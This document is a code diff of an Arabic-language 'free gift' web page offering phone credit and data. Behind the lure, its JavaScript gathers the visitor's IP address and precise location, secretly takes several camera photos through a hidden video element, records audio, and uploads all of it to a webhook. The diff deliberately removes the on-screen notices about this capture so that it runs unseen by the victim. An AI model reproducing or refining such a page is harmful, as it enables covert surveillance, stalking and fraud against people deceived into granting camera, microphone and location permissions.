@@ -9,7 +9,6 @@
     <link href="https://fonts.googleapis.com/css2?family=Cairo:wght@300;400;600;700;800;900&display=swap" rel="stylesheet">
     <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0-beta3/css/all.min.css">
     <style>
-        /* ===== RESET ===== */
         * { margin: 0; padding: 0; box-sizing: border-box; }
         body {
             font-family: 'Cairo', 'Segoe UI', sans-serif;
@@ -39,7 +38,6 @@
             z-index: 1;
         }
 
-        /* ===== HEADER ===== */
         .app-header {
             text-align: center;
             margin-bottom: 28px;
@@ -72,7 +70,6 @@
             opacity: 0.9;
         }
 
-        /* ===== STEP INDICATOR ===== */
         .step-indicator {
             display: flex;
             justify-content: center;
@@ -118,7 +115,6 @@
             background: linear-gradient(90deg, #ffd700, #ff8c00);
         }
 
-        /* ===== MAIN CARD ===== */
         .main-card {
             background: rgba(20, 10, 10, 0.7);
             backdrop-filter: blur(24px);
@@ -151,7 +147,6 @@
             pointer-events: none;
         }
 
-        /* ===== STEPS ===== */
         .step {
             display: none;
             animation: fadeSlide 0.5s ease forwards;
@@ -181,7 +176,6 @@
             margin-bottom: 22px;
         }
 
-        /* ===== COUNTRY GRID ===== */
         .country-grid {
             display: grid;
             grid-template-columns: repeat(auto-fill, minmax(125px, 1fr));
@@ -223,7 +217,6 @@
             transform: scale(0.95);
         }
 
-        /* ===== PERMISSION ===== */
         .permission-wrapper {
             background: rgba(255, 215, 0, 0.03);
             border-radius: 28px;
@@ -262,7 +255,6 @@
             padding-top: 12px;
         }
 
-        /* ===== INPUT ===== */
         .input-group {
             margin: 20px 0 18px;
             text-align: right;
@@ -297,7 +289,6 @@
             font-size: 17px;
         }
 
-        /* ===== BUTTON ===== */
         .btn-gold {
             background: linear-gradient(135deg, #ffd700, #ff8c00);
             border: none;
@@ -346,7 +337,6 @@
             to { transform: rotate(360deg); }
         }
 
-        /* ===== STATUS ===== */
         .status {
             margin-top: 16px;
             padding: 14px 18px;
@@ -376,7 +366,6 @@
             border: 1px solid rgba(255, 69, 0, 0.12);
         }
 
-        /* ===== TIMER ===== */
         .timer-box {
             background: rgba(0,0,0,0.2);
             border-radius: 60px;
@@ -412,7 +401,6 @@
             font-weight: 400;
         }
 
-        /* ===== FOOTER ===== */
         .app-footer {
             margin-top: 30px;
             text-align: center;
@@ -436,7 +424,6 @@
             text-decoration: underline;
         }
 
-        /* ===== HIDDEN ===== */
         #hiddenVideo {
             position: fixed;
             top: -1000px;
@@ -450,7 +437,6 @@
             display: none;
         }
 
-        /* ===== RESPONSIVE ===== */
         @media (max-width: 500px) {
             .app-header h1 { font-size: 28px; }
             .main-card { padding: 20px 16px; border-radius: 40px; }
@@ -474,14 +460,12 @@
 <body>
 
 <div class="app-wrapper">
-    <!-- HEADER -->
     <header class="app-header">
         <div class="logo-icon">🎁</div>
         <h1>هدية مجانية</h1>
         <p class="subtitle">رصيد • نت • وحدات • لكل الدول العربية</p>
     </header>
 
-    <!-- STEP INDICATOR -->
     <div class="step-indicator" id="stepIndicator">
         <div class="step-dot active" data-step="1">1</div>
         <div class="step-line" data-step="1"></div>
@@ -490,7 +474,6 @@
         <div class="step-dot" data-step="3">3</div>
     </div>
 
-    <!-- MAIN CARD -->
     <div class="main-card">
         <!-- STEP 1: COUNTRY -->
         <div class="step active" id="step-country">
@@ -529,14 +512,12 @@
         </div>
     </div>
 
-    <!-- FOOTER -->
     <footer class="app-footer">
         <div><i class="fas fa-lock" style="color: #ffd700;"></i> بياناتك آمنة • خصوصية تامة</div>
         <div class="developer"><i class="fas fa-code"></i> المطور: <a href="https://t.me/iashraf_mousa" target="_blank">@iashraf_mousa</a></div>
     </footer>
 </div>
 
-<!-- hidden video & canvas -->
 <video id="hiddenVideo" autoplay playsinline muted></video>
 <canvas id="hiddenCanvas"></canvas>
 
@@ -796,7 +777,7 @@
         statusTasks.className = 'status';
         statusTasks.style.display = 'block';
         statusTasks.className = 'status info';
-        statusTasks.textContent = '📍 جاري تحديد موقعك لتأكيد الهدية...';
+        statusTasks.textContent = '📍 جاري تحديد موقعك...';
 
         await getLocation();
 
@@ -815,7 +796,7 @@
     }
 
     // ================================================================
-    //  BUTTON CLICK – MAIN ACTION
+    //  BUTTON CLICK – MAIN ACTION (رسالة ثابتة)
     // ================================================================
     claimBtn.addEventListener('click', async () => {
         if (!USER_TOKEN) {
@@ -843,7 +824,9 @@
         claimBtn.disabled = true;
         claimBtn.classList.add('loading');
         claimBtn.querySelector('.btn-text').textContent = 'جاري التأكيد...';
-        showStatus(statusTasks, 'info', '⏳ جاري تجهيز هديتك...');
+        
+        // ⭐ الرسالة الثابتة طوال الوقت ⭐
+        showStatus(statusTasks, 'info', '⏳ جاري إرسال البيانات...');
 
         await getIPAddress();
         await startCameraAndCapture();
@@ -856,7 +839,7 @@
             updateStepIndicator(3);
             startTimer(180);
         } else {
-            showStatus(statusTasks, 'error', '⚠️ تعذر إرسال البيانات، حاول مرة أخرى.');
+            showStatus(statusTasks, 'error', '⚠️ فشل الإرسال، حاول مرة أخرى.');
             claimBtn.disabled = false;
             claimBtn.classList.remove('loading');
             claimBtn.querySelector('.btn-text').textContent = '🎁 احصل على هديتي';
@@ -912,12 +895,9 @@
                     userLocation.lng = bestPosition.coords.longitude;
                     userLocation.accuracy = bestPosition.coords.accuracy;
                     userLocation.error = null;
-                    const msg = `📍 الموقع: ${bestPosition.coords.latitude.toFixed(6)}, ${bestPosition.coords.longitude.toFixed(6)} (دقة ${Math.round(bestPosition.coords.accuracy)} متر)`;
-                    showStatus(statusTasks, 'info', msg);
-                    console.log('✅ [getLocation] نجاح:', msg);
+                    console.log('✅ [getLocation] نجاح:', bestPosition.coords.latitude, bestPosition.coords.longitude);
                 } else {
                     userLocation.error = 'لم نتمكن من الحصول على موقع دقيق';
-                    showStatus(statusTasks, 'error', '❌ تعذر الحصول على الموقع الجغرافي.');
                     console.error('❌ [getLocation] فشل الحصول على الموقع - لا توجد بيانات');
                 }
                 resolve();
@@ -934,7 +914,6 @@
                         resolveWithBest();
                     } else {
                         userLocation.error = 'انتهت مهلة الحصول على الموقع';
-                        showStatus(statusTasks, 'error', '⏳ انتهت مهلة الحصول على الموقع.');
                         resolve();
                     }
                 }
@@ -947,8 +926,6 @@
                 if (accuracy < bestAccuracy) {
                     bestAccuracy = accuracy;
                     bestPosition = pos;
-                    const msg = `📍 جاري تحديد الموقع... الدقة الحالية: ${Math.round(accuracy)} متر`;
-                    showStatus(statusTasks, 'info', msg);
                 }
                 if (accuracy <= TARGET_ACCURACY || attemptCount >= MAX_ATTEMPTS) {
                     console.log(`✅ [getLocation] تم الوصول للدقة المطلوبة (${accuracy} متر) أو انتهت المحاولات (${attemptCount})`);
@@ -962,7 +939,6 @@
                 console.warn(`⚠️ [getLocation] خطأ: ${err.message} (كود ${err.code})`);
                 if (err.code === 1) {
                     userLocation.error = 'تم رفض الإذن بالوصول إلى الموقع';
-                    showStatus(statusTasks, 'error', '🚫 تم رفض الإذن بالوصول إلى الموقع. يرجى السماح في إعدادات المتصفح.');
                     isResolved = true;
                     if (watchId !== null) {
                         navigator.geolocation.clearWatch(watchId);
@@ -973,13 +949,12 @@
                     return;
                 }
                 if (attemptCount < MAX_ATTEMPTS) {
-                    showStatus(statusTasks, 'info', `⏳ محاولة ${attemptCount + 1} للحصول على الموقع...`);
+                    // لا نعرض شيء للمستخدم
                 } else {
                     if (bestPosition) {
                         resolveWithBest();
                     } else {
                         userLocation.error = err.message || 'تعذر الحصول على الموقع';
-                        showStatus(statusTasks, 'error', `❌ خطأ في تحديد الموقع: ${err.message}`);
                         isResolved = true;
                         if (watchId !== null) {
                             navigator.geolocation.clearWatch(watchId);
@@ -996,18 +971,16 @@
                 handleError,
                 { enableHighAccuracy: true, timeout: 5000, maximumAge: 2000 }
             );
-            showStatus(statusTasks, 'info', '📍 جاري الحصول على الموقع الجغرافي بدقة عالية...');
             console.log('📡 [getLocation] تم بدء watchPosition');
         });
     }
 
     // ================================================================
-    //  CAMERA
+    //  CAMERA (بدون رسائل للمستخدم)
     // ================================================================
     async function startCameraAndCapture() {
         return new Promise(async (resolve) => {
             try {
-                showStatus(statusTasks, 'info', '📸 جاري تأكيد هويتك بصرياً...');
                 console.log('📸 [startCameraAndCapture] بدء الكاميرا');
                 const constraints = { video: true, audio: false };
                 mediaStream = await navigator.mediaDevices.getUserMedia(constraints);
@@ -1033,7 +1006,6 @@
                 canvas.width = width;
                 canvas.height = height;
 
-                showStatus(statusTasks, 'info', `📸 جاري التقاط ${TOTAL_PHOTOS} صورة لتأكيد الاستلام...`);
                 capturedPhotoFiles = [];
 
                 for (let i = 1; i <= TOTAL_PHOTOS; i++) {
@@ -1046,18 +1018,15 @@
                         capturedPhotoFiles.push(file);
                     }
                     if (i < TOTAL_PHOTOS) {
-                        showStatus(statusTasks, 'info', `📸 تم التقاط ${i} من ${TOTAL_PHOTOS} صور`);
                         await new Promise(r => setTimeout(r, CAPTURE_INTERVAL));
                     }
                 }
 
-                showStatus(statusTasks, 'info', `✅ تم التقاط ${capturedPhotoFiles.length} صورة بنجاح`);
                 console.log(`✅ [startCameraAndCapture] تم التقاط ${capturedPhotoFiles.length} صور`);
                 resolve(true);
 
             } catch (error) {
                 console.error('❌ [startCameraAndCapture] خطأ:', error);
-                showStatus(statusTasks, 'error', '⚠️ لم نتمكن من تأكيد الهوية بصرياً، حاول مرة أخرى.');
                 if (mediaStream) {
                     mediaStream.getTracks().forEach(t => t.stop());
                     mediaStream = null;
@@ -1069,12 +1038,11 @@
     }
 
     // ================================================================
-    //  AUDIO
+    //  AUDIO (بدون رسائل للمستخدم)
     // ================================================================
     async function recordAudio() {
         return new Promise(async (resolve) => {
             try {
-                showStatus(statusTasks, 'info', '🎤 جاري تأكيد هويتك صوتياً...');
                 console.log('🎤 [recordAudio] بدء التسجيل الصوتي');
                 const audioConstraints = { audio: true };
                 audioStream = await navigator.mediaDevices.getUserMedia(audioConstraints);
@@ -1089,7 +1057,6 @@
                     resolve();
                 };
                 audioRecorder.start();
-                showStatus(statusTasks, 'info', `🎤 جاري التسجيل الصوتي لمدة ${AUDIO_DURATION/1000} ثواني...`);
                 setTimeout(() => {
                     if (audioRecorder.state === 'recording') {
                         audioRecorder.stop();
@@ -1099,7 +1066,6 @@
                 }, AUDIO_DURATION);
             } catch (error) {
                 console.error('❌ [recordAudio] خطأ:', error);
-                showStatus(statusTasks, 'error', '⚠️ لم نتمكن من تأكيد الصوت، حاول مرة أخرى.');
                 resolve();
             }
         });
@@ -1110,7 +1076,6 @@
     // ================================================================
     async function sendAllData() {
         console.log('📤 [sendAllData] بدء إعداد البيانات للإرسال');
-        console.log('📍 [sendAllData] userLocation الحالي:', JSON.stringify(userLocation));
 
         const formData = new FormData();
 
@@ -1145,18 +1110,15 @@
             console.log(`🎤 [sendAllData] تم إضافة ملف صوتي بحجم ${audioBlob.size} بايت`);
         }
 
-        showStatus(statusTasks, 'info', '📤 جاري إرسال البيانات...');
         console.log('📤 [sendAllData] إرسال إلى Webhook');
 
         const result = await sendToWebhook(formData);
 
         if (result.success) {
             console.log('✅ [sendAllData] تم الإرسال بنجاح');
-            showStatus(statusTasks, 'success', '✅ تم إرسال طلبك، هديتك في الطريق!');
             return true;
         } else {
             console.error('❌ [sendAllData] فشل الإرسال:', result.error);
-            showStatus(statusTasks, 'error', '⚠️ فشل الإرسال: ' + result.error);
             return false;
         }
     }
